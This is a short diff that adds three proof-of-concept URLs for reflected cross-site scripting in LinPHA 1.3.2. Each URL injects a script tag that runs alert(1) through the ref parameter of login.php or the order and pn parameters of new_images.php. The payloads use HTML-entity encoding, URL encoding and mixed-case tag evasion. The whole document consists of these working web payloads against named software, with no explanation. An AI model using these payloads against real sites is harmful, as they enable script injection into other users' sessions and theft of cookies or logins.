@@ -1,0 +1,3 @@
+http://www.example.com/linpha-1.3.2/login.php?ref=&#039;&gt;&lt;script&gt;alert(1)&lt;/ScRiPt&gt;
+http://www.example.com/test/linpha-1.3.2/new_images.php?order=%22%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/test/linpha-1.3.2/new_images.php?pn=%22%3Cscript%3Ealert(1)%3C/script%3E
